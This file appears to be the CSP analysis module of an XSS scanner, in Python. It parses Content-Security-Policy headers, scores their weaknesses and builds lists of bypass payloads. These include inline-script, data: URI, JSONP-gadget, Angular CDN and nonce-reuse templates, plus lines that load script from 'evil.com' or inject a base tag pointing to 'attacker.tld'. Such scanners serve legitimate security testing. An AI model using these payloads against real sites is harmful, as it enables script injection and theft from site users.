"""
Content Security Policy (CSP) analysis and bypass automation module.
Consolidates CSP policy evaluation, weakness detection, and automated bypass payloads.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple, Union


class CSPSeverity(Enum):
    """CSP issue severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class CSPDirective(Enum):
    """CSP directives relevant to XSS."""
    SCRIPT_SRC = "script-src"
    DEFAULT_SRC = "default-src"
    STYLE_SRC = "style-src"
    IMG_SRC = "img-src"
    CONNECT_SRC = "connect-src"
    OBJECT_SRC = "object-src"
    FRAME_SRC = "frame-src"
    BASE_URI = "base-uri"
    FORM_ACTION = "form-action"
    REPORT_URI = "report-uri"
    REPORT_TO = "report-to"


@dataclass
class CSPIssue:
    """CSP policy issue."""
    issue_type: str
    severity: CSPSeverity
    description: str
    directive: Optional[str]
    value: Optional[str]


@dataclass
class CSPBypass:
    """CSP bypass technique."""
    technique: str
    payload: str = ""
    description: str = ""
    success_probability: float = 0.5
    # Extended fields for automator compatibility
    payload_template: str = ""
    target_directive: Optional[CSPDirective] = None
    confidence: float = 0.5

    def __post_init__(self) -> None:
        if not self.payload and self.payload_template:
            self.payload = self.payload_template
        elif not self.payload_template and self.payload:
            self.payload_template = self.payload
        if self.confidence != 0.5 and self.success_probability == 0.5:
            self.success_probability = self.confidence
        elif self.success_probability != 0.5 and self.confidence == 0.5:
            self.confidence = self.success_probability


@dataclass
class CSPAnalysis:
    """Complete CSP analysis."""
    is_strict: bool
    bypass_possible: bool
    issues: List[CSPIssue]
    bypasses: List[CSPBypass]
    directives: Dict[str, List[str]]
    raw_csp: str


class CSPAnalyzer:
    """
    Advanced CSP analyzer.
    Analyzes Content-Security-Policy headers for bypass opportunities and weaknesses.
    """

    DANGEROUS_VALUES = ['*', 'unsafe-inline', 'unsafe-eval', 'data:', 'blob:', 'http:', 'https:']
    REQUIRED_DIRECTIVES = ['default-src', 'script-src']
    RECOMMENDED_DIRECTIVES = ['object-src', 'base-uri', 'form-action', 'frame-ancestors']

    BYPASS_TECHNIQUES = {
        'unsafe_inline': {
            'technique': 'unsafe-inline bypass',
            'payload': '<script>alert(1)</script>',
            'description': 'Direct script execution with unsafe-inline',
        },
        'wildcard_origin': {
            'technique': 'Wildcard origin bypass',
            'payload': '<script src="http://evil.com/exploit.js"></script>',
            'description': 'Load scripts from any origin with wildcard',
        },
        'data_uri': {
            'technique': 'data: URI bypass',
            'payload': '<script src="data:text/javascript,alert(1)"></script>',
            'description': 'Execute script from data URI',
        },
        'jsonp_gadget': {
            'technique': 'JSONP gadget bypass',
            'payload': '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&q=test&callback=alert(1)"></script>',
            'description': 'Use JSONP gadget to execute code',
        },
        'angular_cdn': {
            'technique': 'Angular CDN bypass',
            'payload': '{{xss="alert(1)"}}',
            'description': 'Angular template injection with CDN',
        },
        'nonce_reuse': {
            'technique': 'Nonce reuse bypass',
            'payload': '<script nonce="KNOWN_NONCE">alert(1)</script>',
            'description': 'Reuse valid nonce if predictable',
        },
    }

    def __init__(self) -> None:
        self._cache: Dict[str, CSPAnalysis] = {}

    def parse_csp(self, csp_header: str) -> Dict[str, List[str]]:
        """Parse a CSP header into directive name -> list of tokens."""
        directives: Dict[str, List[str]] = {}
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            directive_name = parts[0]
            values = parts[1:] if len(parts) > 1 else []
            directives[directive_name] = values
        return directives

    def analyze_csp(self, csp_header: str) -> CSPAnalysis:
        """Analyze a CSP header for security issues."""
        if csp_header in self._cache:
            return self._cache[csp_header]

        directives = self.parse_csp(csp_header)
        issues: List[CSPIssue] = []
        bypasses: List[CSPBypass] = []

        # Check for missing required directives
        for required in self.REQUIRED_DIRECTIVES:
            if required not in directives:
                issues.append(CSPIssue(
                    issue_type="missing_directive",
                    severity=CSPSeverity.HIGH,
                    description=f"Missing {required} directive",
                    directive=required,
                    value=None,
                ))

        # Check for missing recommended directives
        for recommended in self.RECOMMENDED_DIRECTIVES:
            if recommended not in directives:
                issues.append(CSPIssue(
                    issue_type="missing_recommended_directive",
                    severity=CSPSeverity.MEDIUM,
                    description=f"Missing {recommended} directive (recommended)",
                    directive=recommended,
                    value=None,
                ))

        # Check for dangerous values
        for directive, values in directives.items():
            for value in values:
                raw_val = value.strip("'\"").lower()
                matched_dangerous = None
                for dangerous in self.DANGEROUS_VALUES:
                    if dangerous.endswith(':'):
                        if raw_val in (dangerous, dangerous + '*'):
                            matched_dangerous = dangerous
                            break
                    elif raw_val == dangerous or value == dangerous:
                        matched_dangerous = dangerous
                        break
                if matched_dangerous:
                    issues.append(CSPIssue(
                        issue_type="dangerous_value",
                        severity=CSPSeverity.HIGH,
                        description=f"{directive} contains dangerous value: {matched_dangerous}",
                        directive=directive,
                        value=value,
                    ))

                    if matched_dangerous == 'unsafe-inline':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['unsafe_inline']['technique'],
                            payload=self.BYPASS_TECHNIQUES['unsafe_inline']['payload'],
                            description=self.BYPASS_TECHNIQUES['unsafe_inline']['description'],
                            success_probability=0.9,
                        ))
                    elif matched_dangerous == '*':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['wildcard_origin']['technique'],
                            payload=self.BYPASS_TECHNIQUES['wildcard_origin']['payload'],
                            description=self.BYPASS_TECHNIQUES['wildcard_origin']['description'],
                            success_probability=0.8,
                        ))
                    elif matched_dangerous == 'data:':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['data_uri']['technique'],
                            payload=self.BYPASS_TECHNIQUES['data_uri']['payload'],
                            description=self.BYPASS_TECHNIQUES['data_uri']['description'],
                            success_probability=0.7,
                        ))

        # Check for JSONP gadget domains
        gadget_domains = ['ajax.googleapis.com', 'cdn.jsdelivr.net', 'cdnjs.cloudflare.com']
        for directive, values in directives.items():
            for value in values:
                for gadget in gadget_domains:
                    if gadget in value:
                        issues.append(CSPIssue(
                            issue_type="jsonp_gadget_domain",
                            severity=CSPSeverity.MEDIUM,
                            description=f"{directive} allows JSONP gadget domain: {gadget}",
                            directive=directive,
                            value=value,
                        ))
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['jsonp_gadget']['technique'],
                            payload=self.BYPASS_TECHNIQUES['jsonp_gadget']['payload'],
                            description=self.BYPASS_TECHNIQUES['jsonp_gadget']['description'],
                            success_probability=0.6,
                        ))

        bypass_possible = len(bypasses) > 0
        high_severity = any(
            issue.severity in (CSPSeverity.CRITICAL, CSPSeverity.HIGH) for issue in issues
        )
        is_strict = not bypass_possible and not high_severity

        analysis = CSPAnalysis(
            is_strict=is_strict,
            bypass_possible=bypass_possible,
            issues=issues,
            bypasses=bypasses,
            directives=directives,
            raw_csp=csp_header,
        )
        self._cache[csp_header] = analysis
        return analysis

    def suggest_bypass_payloads(
        self,
        analysis: CSPAnalysis,
        marker: str,
    ) -> List[str]:
        """Suggest potential CSP bypass payloads."""
        payloads: List[str] = []
        for bypass in analysis.bypasses:
            payload = bypass.payload.replace('alert(1)', f"window.__xoxss_csp.push('{marker}')")
            payloads.append(payload)
        return payloads

    def calculate_csp_score(self, analysis: CSPAnalysis) -> float:
        """Calculate overall CSP security score (0-1)."""
        if analysis.is_strict:
            return 1.0

        score = 1.0
        for issue in analysis.issues:
            if issue.severity == CSPSeverity.CRITICAL:
                score -= 0.3
            elif issue.severity == CSPSeverity.HIGH:
                score -= 0.2
            elif issue.severity == CSPSeverity.MEDIUM:
                score -= 0.1
            elif issue.severity == CSPSeverity.LOW:
                score -= 0.05

        score -= len(analysis.bypasses) * 0.15
        return max(0.0, round(score, 2))


class CSPBypassAutomator:
    """
    CSP bypass automation.
    Detects and tests CSP bypass techniques across directives.
    """

    BYPASS_TECHNIQUES = [
        CSPBypass(
            technique="data_uri",
            payload_template='data:text/javascript,{m}',
            description="data: URI script execution",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.8,
        ),
        CSPBypass(
            technique="json_gadget",
            payload_template='{"__proto__":{m}}',
            description="JSONP gadget via data URI",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.7,
        ),
        CSPBypass(
            technique="trusted_types_bypass",
            payload_template='<script type="trusted-types">{m}</script>',
            description="Trusted Types directive bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.6,
        ),
        CSPBypass(
            technique="nonce_prediction",
            payload_template='<script nonce="{nonce}">{m}</script>',
            description="Nonce prediction attack",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.5,
        ),
        CSPBypass(
            technique="hash_source_bypass",
            payload_template='<script src="{m}#sha256-abc..."></script>',
            description="Hash source bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.4,
        ),
        CSPBypass(
            technique="angular_cdn",
            payload_template='<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-csp>{m}</div>',
            description="Angular CSP bypass via CDN",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.9,
        ),
        CSPBypass(
            technique="base_tag_injection",
            payload_template='<base href="https://attacker.tld/">',
            description="Base tag injection for script loading",
            target_directive=CSPDirective.BASE_URI,
            confidence=0.8,
        ),
        CSPBypass(
            technique="iframe_sandbox",
            payload_template='<iframe sandbox="allow-scripts" srcdoc="{m}"></iframe>',
            description="iframe sandbox bypass",
            target_directive=CSPDirective.FRAME_SRC,
            confidence=0.7,
        ),
        CSPBypass(
            technique="object_data",
            payload_template='<object data="data:text/html,{m}"></object>',
            description="Object data URI bypass",
            target_directive=CSPDirective.OBJECT_SRC,
            confidence=0.8,
        ),
        CSPBypass(
            technique="style_attribute",
            payload_template='<div style="background:url({m})"></div>',
            description="Style attribute injection",
            target_directive=CSPDirective.STYLE_SRC,
            confidence=0.6,
        ),
    ]

    def __init__(self) -> None:
        self._detected_bypasses: List[CSPBypass] = []

    def parse_csp(self, csp_header: str) -> Dict[CSPDirective, List[str]]:
        """Parse CSP header into directive enums."""
        csp: Dict[CSPDirective, List[str]] = {}
        if not csp_header:
            return csp
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if not parts:
                continue
            directive_name = parts[0].lower()
            try:
                directive_enum = CSPDirective(directive_name)
                csp[directive_enum] = parts[1:] if len(parts) > 1 else ['*']
            except ValueError:
                pass
        return csp

    def analyze_weaknesses(self, csp: Dict[CSPDirective, List[str]]) -> List[str]:
        """Analyze CSP for exploitable weaknesses."""
        weaknesses: List[str] = []
        script_src = csp.get(CSPDirective.SCRIPT_SRC, [])
        if 'unsafe-inline' in script_src:
            weaknesses.append("script-src allows unsafe-inline")
        if 'unsafe-eval' in script_src:
            weaknesses.append("script-src allows unsafe-eval")
        if '*' in script_src:
            weaknesses.append("script-src allows wildcard (*)")
        if CSPDirective.SCRIPT_SRC not in csp:
            default_src = csp.get(CSPDirective.DEFAULT_SRC, [])
            if '*' in default_src:
                weaknesses.append("No script-src directive, falls back to permissive default-src")
        if CSPDirective.OBJECT_SRC not in csp:
            weaknesses.append("No object-src directive, object/embed may execute")
        if CSPDirective.REPORT_URI in csp:
            weaknesses.append("Legacy report-uri directive present (may be XSS vector)")
        return weaknesses

    def get_applicable_bypasses(
        self,
        csp: Dict[CSPDirective, List[str]],
        marker: str = "xoxss",
    ) -> List[CSPBypass]:
        """Get applicable bypasses for the given CSP configuration."""
        applicable: List[CSPBypass] = []
        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])

        for bypass in self.BYPASS_TECHNIQUES:
            target_directive = bypass.target_directive or CSPDirective.SCRIPT_SRC
            values = csp.get(target_directive, default_src)
            if not values:
                continue
            if '*' in values:
                applicable.append(bypass)
                continue
            if bypass.technique == "data_uri" and any('data:' in v for v in values):
                applicable.append(bypass)
            elif bypass.technique == "angular_cdn" and any('ajax.googleapis.com' in v for v in values):
                applicable.append(bypass)
            elif bypass.technique == "iframe_sandbox" and any('sandbox' in v for v in values):
                applicable.append(bypass)

        return applicable

    def generate_bypass_payloads(
        self,
        bypasses: List[CSPBypass],
        marker: str,
        nonce: Optional[str] = None,
    ) -> List[str]:
        """Generate test payloads for applicable bypasses."""
        payloads: List[str] = []
        for bypass in bypasses:
            template = bypass.payload_template or bypass.payload
            payload = template.replace("{m}", marker)
            if nonce and "{nonce}" in payload:
                payload = payload.replace("{nonce}", nonce)
            payloads.append(payload)
        return payloads

    def test_nonce_prediction(self, html_content: str) -> Optional[str]:
        """Extract or predict script nonce from HTML content."""
        patterns = [
            r'nonce\s*=\s*["\']([^"\']+)["\']',
            r'<script[^>]*nonce=([a-zA-Z0-9+/=]+)',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                return matches[0]
        return None

    def generate_csp_report(self, csp: Dict[CSPDirective, List[str]]) -> str:
        """Generate human-readable summary of CSP directives."""
        report = ["Content-Security-Policy Analysis", ""]
        for directive, values in csp.items():
            report.append(f"{directive.value}: {', '.join(values)}")
        return "\n".join(report)


__all__ = [
    "CSPSeverity",
    "CSPDirective",
    "CSPIssue",
    "CSPBypass",
    "CSPAnalysis",
    "CSPAnalyzer",
    "CSPBypassAutomator",
]
